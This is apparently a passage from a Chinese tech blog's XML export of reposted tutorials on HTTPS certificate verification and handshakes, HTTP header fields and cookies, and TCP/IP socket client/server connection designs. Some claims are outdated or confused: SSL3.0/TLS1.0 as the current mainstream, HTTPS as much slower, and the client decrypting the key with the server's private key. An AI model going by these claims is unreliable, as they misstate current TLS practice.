为了防止“小黑”再次作案，所以颁布一个公正机构来证明你媳妇收到的箱子就是你发出的箱子。在RAS加密中也有一个第三方机构来充当这个角色，负责证明客户端收到的证书就是你发送的证书，中间没有被篡改。这个中间认证机构，就是数组证书认证机构, 其颁发的证书也就是我们常说的CA证书（CA , Certificate Authority）。 下面我们就来详细的叙述一下证书签名，证书分发以及证书验证的整个过程。 服务端人员使用RSA算法生成两个密钥，一个用来加密一个用来解密。将负责加密的那个密钥公布出去，所以我们称之为公钥（Public Key），而用来解密的那个密钥，不能对外公布，只有服务端持有，所以我们称之为私钥（Private Key）。服务端在将Public Key进行分发证书之前需要向CA机构申请给将要分发的公钥进行数字签名。（服务器公钥负责加密，服务器私钥负责解密） 生成数字签名公钥证书：对于CA机构来说，其也有两个密钥，我们暂且称之为CA私钥和CA公钥。CA机构将服务端的Public Key作为输入参数将其转换为一个特有的Hash值。然后使用CA私钥将这个Hash值进行加密处理，并与服务端的Public Key绑定在一起，生成数字签名证书。其实数字签名证书的本质就是服务端的公钥+CA私钥加密的Hash值。（CA私钥负责签名，CA公钥负责验证） 服务器获取到这个已经含有数字签名并带有公钥的证书，将该证书发送给客户端。当客户端收到该公钥数字证书后，会验证其有效性。大部分客户端都会预装CA机构的公钥，也就是CA公钥。客户端使用CA公钥对数字证书上的签名进行验证，这个验证的过程就是使用CA公钥对CA私钥加密的内容进行解密，将解密后的内容与服务端的Public Key所生成的Hash值进行匹配，如果匹配成功，则说明该证书就是相应的服务端发过来的。否则就是非法证书。 验证完服务端公钥的合法性后，就可以使用该公钥进行加密通信了。 下方这个截图就是苹果的根证书的一些信息，从下方可以看出，CA证书内容中包括加密算法，公共密钥以及数字签名。 下方就是公钥以及数字签名的具体内容，当对下方公共密钥进行验证时，需要使用内置的CA公钥将数字签名进行解密。然后将解密后的内容，与公钥生成的Hash值进行比较，如果匹配成功，那么该证书就是CA机构颁布的合法证书。 HTTPS安全通信机制的建立上面我们聊完AES与RSA加密策略，然后又聊了带有数字签名的公共密钥。上面这两部分内容都是为HTTPS做铺垫的，接下来就看一看HTTP+SSL是如何进行数据传输的。 HTTPS简介在开头的部分也说了，HTTPS不是一个新的通信协议，而是HTTP与SSL（或TSL）的组合。SSL–安全套节层(Secure Socket Layer), TSL（Transport Layer Security 安全传输层）是以SSL为原型开发的协议，IETF以SSL3.0为基准后又制定了TLS1.0、TLS1.1和TLS1.2，当前主流版本为SSL3.0与TLS1.0。 HTTPS就是在HTTP与TCP层中间添加了一个SSL层。因为HTTPS被HTTP多了这层加密的流程，所以HTTPS的速度要比HTTP慢的多。 HTTPS的通信过程SSL的加密过程是RSA与AES混合进行的。简单概括一下，就是通过RSA加密方式来交换AES加解密的密钥，然后使用AES加密的方式来传输报文。下方是SSL建立连接以及传输数据的图解。在下图中大体可以分为四步： 第一步：有客户端发起的第一次握手，此次握手过程的主要目的是从服务端获取数字签名证书，服务端在发送数字签名证书之前要先确认客户端的SSL版本、加密算法等信息。 第二步：完成第一次握手后，接着进行第二次握手。第二次握手是在客户端收到证书后发起的，主要目的是将AES加解密使用的Key （Pre-master secret）发送给服务端。当然这个AES_KEY是使用第一次握手获取的公钥进行加密的。客户端收到这个使用公钥加密后的AES_KEY，使用服务端的私钥进行解密。这样客户端和服务端经过二次握手后都持有了AES加解密的KEY。 第三步：当Client与Server端都持有AES_KEY后，就可以对HTTP报文进行加解密了。END: 最后就是断开连接了。具体如下图所示：]]></content>
      <categories>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>TCP/IP</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP协议族(二) HTTP报文头解析]]></title>
    <url>%2F2018%2F01%2F04%2FTCP%3AIP%E5%8D%8F%E8%AE%AE%E6%97%8F(%E4%BA%8C)%20HTTP%E6%8A%A5%E6%96%87%E5%A4%B4%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[转载：http://www.cnblogs.com/ludashi/p/6237340.html 本篇博客我们就来详细的聊一下HTTP协议的常用头部字段，当然我们将其分为请求头和响应头进行阐述。下方是报文头每个字段的格式，首先是头部字段的名称，如Accept，冒号后方紧跟的是该字段名所对应的值，每个值之间有逗号分隔。如果该值需要优先级，那么在值的后方跟上优先级q=0.8(q的值由0~1，优先级从低到高)。值与优先级中间由分号相隔。 头部字段名：值1, 值2;q=0.8 下方就是截取的网络请求中Request Headers的部分内容。红框中的Accept-Language就是头部字段名，冒号后边就是该字段相应的值了。如下所示： HTTP头部字段可以分为通用头部字段，请求头部字段，响应头部字段以及实体头部字段，下方会给出详细的介绍。 通用头部字段 （General Header Fields）该字段在请求头和响应头都会使用到，下方是常用的通用头部字段： Cache-Control用来操作缓存的工作机制，下方截图响应头中的的Cache-Control的参数为private和max-age=10。private缓存是私有的，仅像特定用户提供相应的缓存信息。如果是public，那么就意味着可向任意方提供相应的缓存信息。max-age = 10表示缓存有效期为10秒。从下方的Expires(过期时间)和Last-Modified(最后修改时间)就可以看出，这两者之间的差值正好是10秒。 该字段还可以对应其他的参数： no-cache：如果是客户端的话，说明客户端不会接收缓存过的响应，要请求最新的内容。而服务器端则表示缓存服务器不能对相应的资源进行缓存。 no-store：表示缓存不能在本地存储。 max-age：该参数后方会被赋值上相应的秒数，在请求头中表示如果缓存时间没有超过这个值就返回给我。而在响应头中时，则表示资源在缓存服务器中缓存的最大时间。 only-if-cached：表示客户端仅仅请求缓存服务器上的内容，如果缓存服务器上没有请求的内容，那么返回504 Gateway Timeout。 must-revalidata：表示缓存服务器在返回资源时，必须向资源服务器确认其缓存的有效性。 no-transform：无论请求还是响应，都不能在传输的过程中改变报文体的媒体类型。 Connection该字段可以控制不转发给代理服务器的首部字段以及管理持久连接，下方这个响应报文头中的Connection就是用来管理持久连接的，其参数为keep-alive，就是保持持久连接的意思。可以使用close参数将其关闭。 Transfer-Encoding该字段表示报文在传输过程中采用的编码方式，在HTTP/1.1的报文传输过程中仅对分块编码有效。下方这个截图就是Transfer-Encoding在Response Header中的使用，后边根的chunked(分块)的参数，说明报文是分块进行传输的。 Via该字段是为了追踪请求和响应报文测传输路径，报文经过代理或者网关是会在Via字段添加该服务器的信息，然后再进行转发。 请求头部字段 （Request Header Fields）顾名思义，请求头部字段当然是在请求头中才使用的字段。该字段用于补充请求的附加信息，客户端信息等。接下来将给出常用而且比较重要的几个请求头部字段。 Accept该字段可通知服务器用户代理能够处理的媒体类型以及该媒体类型对应的优先级。媒体类型可使用“type/subtype”这种形式来指定，分号后边紧跟着的是该类型的优先级。如下所示。 Accept-Encoding该字段用来告知服务器，客户端这边可支持的内容编码以及相应内容编码的优先级, 下方就是Accept-Encoding的用法。gzip表示由文件压缩程序gzip(GNU zip)生成的编码格式。compress表示UNIX文件压缩程序compress生成的编码格式。deflate表示组合使用zlib格式以及有deflate压缩算法生成的编码格式。identity表示不执行压缩或者使用一致的默认编码格式。 Accept-Language该字段用来告知服务器，客户端可处理的自然语言集，以及对应语言集的优先级。以下方的截图为例，Accept-Language后方跟了三个属性，分别是“zh-CN”, “zh;q=0.8”，“en;q=0.6”。也就是说客户端可处理三种自然预言集，zh-CN，其优先级是1（最高）。第二种是zh ，其优先级是0.8，次之。第三个是en，优先级为0.6，优先级在三者之间最低。 Authorization用来告知服务器用户端的认证信息，下方就是连接公司内部SVN系统时需要认证时的请求头部信息。 如果你没有填写认证信息的话，那么就会返回401 Unauthorized。如下所示： If-Match 与If-None-Match上面这两个请求头部字段都是带有逻辑判断的，从上面的英文我们不难看出两者恰好相反。两者后方都跟着串字符串，如If-Match “xcsldjh49773hce”, 后边这个字符的匹配对象是ETag(稍后会介绍)。If-Match的请求是如果后方的字符串与ETag相等则服务器端进行请求，否则不进行处理。If-None-Match是If-Match的非操作，同样是匹配ETag, 如果Etag没有匹配成功就处理请求，否则不处理。 If-Modified-Since与If-Unmodified-SinceIf-Modified-Since也是带有逻辑判断的请求头部字段，该字段后方跟的是一个日期，意思是在该日期后发生了资源更新，那么服务器就会处理该请求。If-Unmodified-Since就是 If-Modified-Since的非操作。 If-Rangeif-Range字段后方也是跟的Etag, 该字段要结合着Range字段进行使用。其所代表的意思就是如果Etag匹配成功，请求的内容就按照Range字段所规定的范围进行返回，否则返回全部的内容。用法如下所示： 12If-Range: &quot;etag_code&quot; Range: bytes=1000-5000 Referer其实Referer是一个错误的拼写，但是一直在使用。正确的英文单词应该是Referrer(此处可翻译为:来历、来路)。Referer字段后方跟的是一个URI, 该URI就是发起请求的URI，具体如下所示： User-Agent该字段会将请求方的浏览器和用户代理名称等信息传达给服务器。下方就是从我当前笔记本的Chrome浏览器请求网络时的User-Agent信息。 示例 响应头部字段 （Request Header Fields）聊完请求报文头部字段后，我们接下来来聊一下响应报文头部字段。响应头是由Server向Client返回响应报文中使用的头部信息。用户补充响应的附加信息、服务信息等。下方是几个常见响应头部字段。 Accept-Ranges该字段用来告知客户端服务器那边是否支持范围请求（请求部分内容，请求头中使用Range字段）。Accept-Ranges的值为bytes时，就说明服务器支持范围请求，为none时，说明服务器不支持客户端的范围请求。下方是博客园的页面的加载，从下方可以看出是支持范围请求的，如下所示： Age该字段告知客户端，源服务器在多久前创建了该响应。 EtagEtag是服务器（当前）请求的服务器资源（图片，HTML页面等）所对应的一个独有的字符串。不同资源间的Etag是不同的，当资源更新时Etag也会进行更新。 所以结合着请求头中的If-Match等逻辑请求头，可以判断当前Client端已经加载的资源在服务器端是否已经更新了。当初次请求一个资源，如图片时，我们可以将其Etag进行保存，在此请求时，可放在If-None-Match后方，进行资源更新。如果服务器资源并未修改，就不对该请求做出响应。下方就是网页中某张图片对应着的Etag，如下所示。 LocationLocation字段一般与重定向结合着使用。下方是我访问“www.baidu.com/hello”这个连接的响应报文。因为服务器上并没有/hello这个资源路径，所以给我重定向了error.html页面，这个重定向的URL就存储在Location字段中，如下所示： Server该响应字段表明了服务器端使用的服务器型号，下方是博客园某张图片的响应头，使用的Web服务器是Tengine, Tengin是淘宝发起的Web服务器项目，是基于Nginx的，关于Tengin的相关内容，请自行Google吧。 VaryVary可对缓存进行控制，通过该字段，源服务器会向代理服务器传达关于本地缓存使用方法的命令。下方就是Vary的使用，Vary后方的参数是Accept-Encoding。其意思是返回的缓存要以Accept-Encoding为准。当请求的Accept-Encoding的参数与缓存内容的Accept-Encoding参数一致时就返回缓存内容，否则就请求源服务器。 WWW-Authenticate该字段用于HTTP的访问认证，在状态码401 Unauthorized中肯定带有此字段，该字段用来指定客户端的认证方案（Basic或者Digest）。参数realm的字符串是为了辨别请求URL指定资源所受到的保护策略。如下所示： 实体头部字段（Content Header Fields） 接下来我们就来聊聊常见的实体头部字段，实体头部字段是报文实体所使用的头部，用来补充与报文实体相关的信息。 Allow该字段用于服务器通知客户端服务器这边所支持的所有请求方法（GET、POST等）。如果服务器找不到客户端请求中所提到的方法的话，就会返回405 Method Not Allowed，于此同时还会把所有能支持的HTTP方法写入到首部字段Allow后返回。 1Allow : GET, POST, HEAD, PUT, DELETE Content-Encoding该字段用来说明报文实体的编码方式，下方这段报文头中的Content-Encoding的参数为gzip，说明是使用gzip对报文实体进行压缩的。 Content-Language该字段表示报文实体使用的自然语言，使用方式如下所示： 1Content-Language: zh-CN Content-Length顾名思义，该字段用来指定报文实体的字节长度，如下所示： Content-MD5该字段中存储的是报文实体进行MD5加密然后再使用Base64进行编码的字符串。客户端收到响应报文后，可以对报文实体进行MD5加密，然后再对其进行Base64编码，然后与Content-MD5中的字符串进行比较来确定报文是否进行修改，可以说这是一个简单的验签功能。但是此方法并不能确定报文是否被修改了，因为Content-MD5这个值也有可能被篡改。 Cookie相关的头部字段因为HTTP协议本身是无状态的，在Web站点中使用Cookie来管理服务器与客户端之间的状态。解析来我就来介绍一下Cookie相关的头部字段。 Set-Cookie响应报文中会使用到该字段。当服务器准备开始管理客户端的状态时，会事先告知其各种信息。下方字段是登录知乎时所返回的所要设置的Cookie信息。接下来我们就要对这串Cookie信息进行解析。 键值对：在Set-Cookie字段中，“z_co=Mi4……”这就是要存入Cookie中的信息，当然可以是多个键值对，中间使用逗号进行分割即可。 Domain：然后是Domain属性，由下方不难看出，Domain中存储的就是Cookie适用对象的域名，若不指定Domain的值，那么默认就是创建Cookie的服务器的域名。 expire：该字段属性的值是一个时间，也就是Cookie的有效期，若不指定该属性的值，默认就是当前会话有效，关闭浏览器Cookie即失效。 httponly：设置该属性的目的是让JavaScript脚本无法获取Cookie，其主要目的是防止跨站脚本攻击对Cookie信息的窃取。 path： 用于限制指定Cookie的发送范围的文件目录。 Secure：仅在HTTPS安全通信时才会发送Cookie。 Cookie请求报文头中会使用该字段，用于将本地存储的Cookie信息发送给服务端。下方就是知乎上每次请求文章所带有的Cookie信息，当然下方只是部分信息，但是我们还是从中可以找到之前我们存储的“z_co=Mi4……”这个键值对的。 存储cookie是浏览器提供的功能。cookie 其实是存储在浏览器中的纯文本，浏览器的安装目录下会专门有一个 cookie 文件夹来存放各个域下设置的cookie。 当网页要发http请求时，浏览器会先检查是否有相应的cookie，有则自动添加在request header中的cookie字段中。这些是浏览器自动帮我们做的，而且每一次http请求浏览器都会自动帮我们做。这个特点很重要，因为这关系到“什么样的数据适合存储在cookie中”。 存储在cookie中的数据，每次都会被浏览器自动放在http请求中，如果这些数据并不是每个请求都需要发给服务端的数据，浏览器这设置自动处理无疑增加了网络开销；但如果这些数据是每个请求都需要发给服务端的数据（比如身份认证信息），浏览器这设置自动处理就大大免去了重复添加操作。所以对于那设置“每次请求都要携带的信息（最典型的就是身份认证信息）”就特别适合放在cookie中，其他类型的数据就不适合了。 但在 localStorage 出现之前，cookie被滥用当做了存储工具。什么数据都放在cookie中，即使这些数据只在页面中使用而不需要随请求传送到服务端。当然cookie标准还是做了一些限制的：每个域名下的cookie 的大小最大为4KB，每个域名下的cookie数量最多为20个（但很多浏览器厂商在具体实现时支持大于20个）。 cookie详解]]></content>
      <categories>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>TCP/IP</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP/IP 应用程序的通信连接模式]]></title>
    <url>%2F2018%2F01%2F04%2FTCP%3AIP%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E9%80%9A%E4%BF%A1%E8%BF%9E%E6%8E%A5%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[转载：刘光宝:https://www.ibm.com/developerworks/cn/aix/library/0807_liugb_tcpip/index.html TCP/IP 应用层与应用程序TCP/IP 起源于二十世纪 60 年代末美国政府资助的一个分组交换网络研究项目，它是一个真正的开放协议，很多不同厂家生产各种型号的计算机，它们运行完全不同的操作系统，但 TCP/IP 协议组件允许它们互相进行通信。现在 TCP/IP 已经从一个只供一些科学家使用的小实验网成长为一个由成千上万的计算机和用户构成的全球化网络，TCP/IP 也已成为全球因特网（Internet）的基础，越来越多的 TCP/IP 互联网应用和企业商业应用正在改变着世界。 TCP/IP 通讯协议采用了四层的层级模型结构（注：这与 OSI 七层模型不相同），每一层都调用它的下一层所提供的网络任务来完成自己的需求。TCP/IP 的每一层都是由一系列协议来定义的。这 4 层分别为： 应用层 (Application)：应用层是个很广泛的概念，有一些基本相同的系统级 TCP/IP 应用以及应用协议，也有许多的企业商业应用和互联网应用。 传输层 (Transport)：传输层包括 UDP 和 TCP，UDP 几乎不对报文进行检查，而 TCP 提供传输保证。 网络层 (Network)：网络层协议由一系列协议组成，包括 ICMP、IGMP、RIP、OSPF、IP(v4,v6) 等。 链路层 (Link)：又称为物理数据网络接口层，负责报文传输。 图１显示了 TCP/IP 层级模型结构，应用层之间的协议通过逐级调用传输层（Transport layer）、网络层（Network Layer）和物理数据链路层（Physical Data Link）而可以实现应用层的应用程序通信互联。 应用层需要关心应用程序的逻辑细节，而不是数据在网络中的传输活动。应用层其下三层则处理真正的通信细节。在 Internet 整个发展过程中的所有思想和着重点都以一种称为 RFC（Request For Comments）的文档格式存在。针对每一种特定的 TCP/IP 应用，有相应的 RFC 文档。一些典型的 TCP/IP 应用有 FTP、Telnet、SMTP、SNTP、REXEC、TFTP、LPD、SNMP、NFS、INETD 等。RFC 使一些基本相同的 TCP/IP 应用程序实现了标准化，从而使得不同厂家开发的应用程序可以互相通信。 然而除了这些已经实现标准化的系统级 TCP/IP 应用程序外，在企业商业应用和互联网应用开发中，存在着大量的商业应用程序通信互联问题。如图 １ 显示，其中的应用层所包含应用程序主要可以分成两类，即系统级应用和商业应用，互联网商业应用是商业应用中的主要形式之一。 不同开发商和用户在开发各自商业应用通信程序时也存在有许多不同的设计方式。关于 TCP/IP 应用层以下的技术文献与书籍早已是汗牛充栋，但是关于 TCP/IP 应用本身，尤其是关于商业应用的通信设计模式技术讨论方面的文章还是比较少的。TCP/IP 应用通信设计模式实际上是在 TCP/IP 基础编程之上的一种应用编程设计方式，也属于一种应用层协议范畴，其可以包含有 TCP/IP 地址族模式设计、I/O 模式设计、通信连接模式设计以及通信数据格式设计等。鉴于目前讨论 TCP/IP 商业应用程序设计模式问题这方面的文章还很少见，本文尝试给出一些通信连接模式设计中共同的概念与一些典型的设计模式，在以后的文章中将继续讨论地址族模式设计、I/O 模式设计、以及通信数据格式设计等方面的模式设计实现话题。 通信连接模式设计主要考虑内容有： 通信两端程序建立通信方式 通信连接方式 通信报文发送与接收方式 以下内容将介绍建立通信的 Client/Server 模型，然后逐一介绍通信连接模式设计所需要考虑的这些内容。 传输层接口 APIs 与 TCP/IP 应用程序 C/S 模型传输层接口 APIsTCP/IP 应用层位于传输层之上，TCP/IP 应用程序需要调用传输层的接口才能实现应用程序之间通信。目前使用最广泛的传输层的应用编程接口是套接字接口（Socket）。Socket APIs 是于 1983 年在 Berkeley Socket Distribution (BSD) Unix 中引进的。 1986 年 AT&amp;T 公司引进了另一种不同的网络层编程接口 TLI（Transport Layer Interface），1988 年 AT&amp;T 发布了一种修改版的 TLI，叫做 XTI（X/open Transport interface）。XTI/TLI 和 Socket 是用来处理相同任务的不同方法。关于 TCP/IP APIs 使用文章与书籍已相当多，本文则是侧重于如何组合使用这些 APIs 来进行 TCP/IP 应用程序连接模式设计，并归纳出几种基本应用连接模式。 如图 ２ 显示，应用层是通过调用传输层接口 APIs（Socket 或 XTI/TLI）来与传输层和网络层进行通信的。 不管是使用何种编程接口，要在两个机器或两个程序之间建立通信，通信双方必须建立互相一致的通信模式。如果双方的通信设计模式不一致就无法建立有效的通信连接。 以下是经常使用的 socket APIs，是建立 TCP/IP 应用程序的标准接口，也是影响 TCP/IP 应用程序通信方式的几个主要 APIs，不同 APIs 组合再结合系统调用可以实现不同方式的应用。Sockets 支持多种传输层和网络层协议，支持面向连接和无连接的数据传输，允许应用分布式工作。 socket()：是用来创建一个 socket，socket 表示通信中的一个节点，其可以在一个网络中被命名，用 socket 描述符表示，socket 描述符类似于 Unix 中的文件描述符。 bind()：是用来把本地 IP 层地址和 TCP 层端口赋予 socket。 listen() ：把未连接的 socket 转化成一个等待可连接的 socket，允许该 socket 可以被请求连接，并指定该 socket 允许的最大连接数。 accept()：是等待一个连接的进入，连接成功后，产生一个新的 socket 描述符，这个新的描述符用来建立与客户端的连接。 connect()：用来建立一个与服务端的连接。 send()：发送一个数据缓冲区，类似 Unix 的文件函数 write()。另外 sendto() 是用在无连接的 UDP 程序中，用来发送自带寻址信息的数据包。 recv()：接收一个数据缓冲区，类似 Unix 的文件函数 readI()。另外 recvfrom() 是用在无连接的 UDP 程序中，用来接收自带寻址信息的数据包。 close()：关闭一个连接 Client/Server 模型Sockets 是以 Client 和 Server 交互通信方式来使用的。典型的系统配置是把 Server 放在一台机器中，而把 Client 放在另一台机器中，Client 连接到 Server 交换信息。一个 socket 有一系列典型的事件流。例如，在面向连接的 Client/Server 模型中，Server 端的 socket 总是等待一个 Client 端的请求。要实现这个请求，Server 端首先需要建立能够被 Client 使用的地址，当地址建立后，Server 等待 Client 请求服务。当一个 Client 通过 socket 连接到 Server 后，Client 与 Server 之间就可以进行信息交换。Client/Server 是通信程序设计的基本模式。从软件开发的角度讲，TCP/IP 应用程序都是基于 Client/Server 方式的。注意本篇文章以下 Client/Server 概念是针对程序内部调用 Socket API 所讲的概念，与针对整个程序甚至针对机器而讲的客户端 / 服务器概念有所不同。用 Server APIs 建立的程序可以被当作客户端使用，用 Client APIs 建立的程序也可以被用作服务器端使用。建立 Server 需要的 APIs 有 socket(), bind(), listen(), accept()，建立 Client 需要的 APIs 有 Socket(), Connect()。在实际应用开发中，同一个程序里往往同时可以有 Client 和 Server 的代码，或者多种形式的组合。在实际应用编程中，针对 Socket APIs 不同有效组合，结合系统调用可以有多种复杂的设计变化。 面向连接的应用编程存在三类基本的不同级别的设计方式范畴，根据 Socket APIs 从上到下顺序依次是： Client/Server 通信建立方式 Client/Server 通信连接方式 Client/Server 通信发送与接收方式 下面内容以面向连接的 Socket 应用编程为例来说明这几种不同通信范畴的设计实现。 Client/Server 建立方式设计概述一个 Client 连接一个 Server如果只有两台机器之间连接，那么一个是 Client，另一个是 Server，如下面图 3 所示。这是最简单的 TCP/IP 的应用，也是 TCP/IP 应用早期的 Peer to Peer (P2P) 概念。其流程基本如图 ４ 所示。 图 4 显示了 TCP/IP 应用编程最基本的 Client/Server 模式，显示了基本的 Client/Server 通信所需要调用的 Socket APIs 以及顺序。 多个 Client 连接一个 Server多个 Client 同时连接一个 Server 是 TCP/IP 应用的主流形式，如图 ５ 所示，其中 Client 连接数可以从几个到成千上万。 由于 socket APIs 缺省方式下都是阻塞方式的，实现多个 Client 同时连接一个 Server 就需要特别的设计。其实现方式可以有多种不同的设计，这其中也涉及 I/O 模式设计。下面将展开介绍其中几种设计形式。 利用一个 Client 连接一个 Server 形式实现多 Client 连接从程序设计角度讲，只要 Client 和 Server 端口是一对一形式，那么就属于一个 Client 连接一个 Server 形式。在处理多个 Client 端连接时，Server 端轮流使用多个端口建立多个 Client-Server 连接，连接关闭后，被释放端口可以被循环使用。在这种多连接形式中需要谨慎处理 Client 端如何获取使用 Server 端的可用端口。比如图 ６ 显示 Server 有一个服务于所有进程的进程可以先把 Server 端的可用端口发送给 Client 端，Client 端再使用该端口建立连接来处理业务。Server 针对每一个 Client 连接用一个专门的进程来处理。由于可用端口数有限，Server 用一个有限循环来处理每一个可用的端口连接。由于新端口需要用 bind() 来绑定，所以需要从 bind() 开始到 close() 结束都需要包含在循环体内。 使用多个 accept() 实现多 Client 连接多进程 Server 一般有一个专注进程是服务于每一个连接的。当 Client 端完成连接后，专注进程可以循环被另外的连接使用。使用多个 accept() 也可以实现处理多 Client 连接。多 accept() 的 Server 也只有一个 socket()，一个 bind()，一个 listen()，这与通常情况一样。但是它建立许多工作子进程，每一个工作子进程都有 accept()，这样可以为每一个 Client 建立 socket 描述符。如图 ７ 所示，由于 accept() 连接成功后，会产生一个新的 socket 描述符，这样通过循环多进程利用 accept() 产生的多 socket 描述符就可以与多个 Client 进行连接通信。循环体是从 accept() 开始到 close() 结束的。 使用并发 Server 模式实现多 Client 连接并发服务器模式曾经是 TCP/IP 的主流应用程序设计模式，得到广泛使用，目前互联网上仍有相当多的应用使用此种模式。其设计思路是在 accept 之后 fork 出一个子进程。因为 socket 会产生监听 socket 描述符 listenfd，accept 会产生连接 socket 描述符 connfd。连接建立后，子进程继承连接描述符服务于 Client，父进程则继续使用监听描述符等待另外一个 Client 的连接请求，以产生另外一个连接 socket 描述符和子进程。如图 ８ 所示，accept() 接收到一个 Client 连接后，产生一个新的 socket 描述符，通过 fork() 系统调用，用一个子进程来处理该 socket 描述符的连接服务。而父进程可以立即返回到 accept()，等待一个新的 Client 请求，这就是典型的并发服务器模式。并发服务器模式同时处理的最大并发 Client 连接数由 listen() 的第二个参数来指定。 使用 I/O 多路技术实现多 Client 连接 以上三种连接设计，多 Server 端口、多 accept() 和并发服务器模式，都是通过 fork() 系统调用产生多进程来实现多 Client 连接的。使用 I/O 多路技术也可以同时处理多个输入与输出问题，即用一个进程同时处理多个文件描述符。I/O 多路技术是通过 select() 或 poll() 系统调用实现的。poll() 与 select() 功能完全相同，但是 poll() 可以更少使用内存资源以及有更少的错误发生。select() 调用需要与操作文件描述符集的 APIs 配合使用。select() 系统调用可以使一个进程检测多个等待的 I/O 是否准备好，当没有设备准备好时，select() 处于阻塞状态中，其中任一设备准备好后，select() 函数返回调用。select() API 本身也有一个超时时间参数，超时时间到后，无论是否有设备准备好，都返回调用。其流程如图 9 所示。在 socket APIs listen() 和 accept() 之间插入 select() 调用。使用这三个宏 FD_ZERO()、FD_CLR() 和 FD_SET()，在调用 select() 前设置 socket 描述符屏蔽位，在调用 select() 后使用 FD_ISSET 来检测 socket 描述符集中对应于 socket 描述符的位是否被设置。 FD_ISSET() 就相当通知了一个 socket 描述符是否可以被使用，如果该 socket 描述符可用，则可对该 socket 描述符进行读写通信操作。通常，操作系统通过宏 FD_SETSIZE 来声明在一个进程中 select() 所能操作的文件或 socket 描述符的最大数目。更详细的 I/O 多路技术实现，可以参考其他相关文献。 一个 Client 连接多个 Server一个 Client 连接多个 Server 这种方式很少见，主要用于一个客户需要向多个服务器发送请求情况，比如一个 Client 端扫描连接多个 Server 端情况。如图 １０ 所示。此种方式设计主要是 Client 端应用程序的逻辑设计，通常需要在 Client 端设计逻辑循环来连接多个 Server，在此不做更多描述。 复杂 Client/Server 设计与现代 P2P最近几年，对等网络技术 ( Peer-to-Peer，简称 P2P) 迅速成为计算机界关注的热门话题之一，以及影响 Internet 未来的科技之一。与早期点对点 (Peer to Peer) 的 Client/Server 模式不同，现在的 P2P 模式是指每个结点既可充当服务器，为其他结点提供服务，同时也可作为客户端享用其他结点提供的服务。实际上 P2P 模式仍然是基于 Client/Server 模式的，每个通信节点都既是 Server，又是 Client，P2P 是基于复杂 Client/Server 设计的 TCP/IP 应用。图 １１ 显示 P2P 模式下两个用户 PC 之间的对等连接。 在技术上，P2P 本身是基于 TCP/IP Client/Server 技术的一种设计模式思想， P2P 也属于网络应用层技术，与 Web 和 FTP 等应用是并列的。只是 P2P 应用在设计实现上更要复杂的多。P2P 技术实现的协同工作是无需专门的服务器支持的 (Serverless)，这里的服务器概念与 Client/Server 中的 Server 概念是不一样的。在传统意义上中心服务器机器上往往运行的是 TCP/IP 应用的 Server 端程序，所以传统意义上的 Server 概念在机器与应用上是重合的。如果更改 TCP/IP 的应用设计，使应用程序既可做 Server 又可做 Client，就可以实现无中心服务器的 P2P 模式。 在设计模式上，P2P 模式实现了网络终端用户不依赖中心服务器或者服务商而直接进行信息和数据交换的可能，因此 P2P 正在改变着整个互联网的一些基础应用，从而极大地增加了用户之间的信息沟通和交流能力。目前互联网的 P2P 应用与网络都正在飞速发展，一些典型的 P2P 应用程序比如有 BitTorrent, eDonkey 等，另外一些即时通信（IM）类软件比如 MSN、QQ 等也正在向无中心服务器模式转变。无中心服务器的 Internet 应用程序大大降低应用提供商的运营成本，而且减少人们对于 Server 稳定性的依赖。 Client/Server 通信连接方式设计Client/Server 通信方式建立后，下一步就需要考虑通信连接的方式，主要有两种方式的连接，即长连接通信与短连接通信。通信连接方式涉及到的 APIs 主要是 connect() 和 accept()。要实现某种 Client/Server 方式，就必须考虑用某种特定的连接方式。 短连接通信短连接通信是指 Client 方与 Server 方每进行一次通信报文收发交易时才进行通讯连接，交易完毕后立即断开连接。此种方式常用于多个 Client 连接一个 Server 情况，常用于机构与用户之间通信，比如 OLTP（联机事务处理）类应用。在短连接情况下，Client 端完成任务后，就关闭连接并退出。在 Server 端，可以通过循环 accept()，使 Server 不会退出，并连续处理 Client 的请求。图 １２ 显示了一般情况下短连接通信模式的 Socket 事件流，不同设计的连接多 Client 的 Server 有不同的循环流程。 长连接通信长连接通信是指 Client 方与 Server 方先建立通讯连接，连接建立后不会断开，然后再进行报文发送和接收，报文发送与接收完毕后，原来连接不会断开而继续存在，因此可以连续进行交易报文的发送与接收。这种方式下由于通讯连接一直存在，其 TCP/IP 状态是 Established，可以用操作系统的命令 netstat 查看连接是否建立。由于在长连接情况下，Client 端和 Server 端一样可以固定使用一个端口，所以长连接下的 Client 也需要使用 bind() 来绑定 Client 的端口。在长连接方式下，需要循环读写通信数据。为了区分每一次交易的通信数据，每一次交易数据常常需要在数据头部指定该次交易的长度，接收 API 需要首先读出该长度，然后再按该长度读出指定长度的字节。长连接方式常用于一个 Client 端对一个 Server 端的通讯，一般常用于机构与机构之间的商业应用通信，以处理机构之间连续的大量的信息数据交换。或者说可用于两个系统之间持续的信息交流情况。通常为了加快两个系统之间的信息交流，通常还需要建立几条长连接的并行通信线路。图 １３ 显示了一般情况下长连接通信模式的 socket 事件流，可见其最大特点是 Client 和 Server 都有循环体，而且循环体只包含读写 APIs。 Client/Server 通信发送与接收方式设计在通信数据发送与接收之间也存在不同的方式，即同步和异步两种方式。这里的同步和异步与 I/O 层次的同异步概念不同。主要涉及 socket APIs recv() 和 send() 的不同组合方式。 同步发送与接收从应用程序设计的角度讲，报文发送和接收是同步进行的，既报文发送后，发送方等待接收方返回消息报文。同步方式一般需要考虑超时问题，即报文发出去后发送方不能无限等待，需要设定超时时间，超过该时间后发送方不再处于等待状态中，而直接被通知超时返回。同步发送与接收经常与短连接通信方式结合使用，称为同步短连接通信方式，其 socket 事件流程可如上面的图 １２ 所示。 异步发送与接收从应用程序设计的角度讲，发送方只管发送数据，不需要等待接收任何返回数据，而接收方只管接收数据，这就是应用层的异步发送与接收方式。要实现异步方式，通常情况下报文发送和接收是用两个不同的进程来分别处理的，即发送与接收是分开的，相互独立的，互不影响。异步发送与接收经常与长连接通信方式结合使用，称为异步长连接通信方式。从应用逻辑角度讲，这种方式又可分双工和单工两种情况。 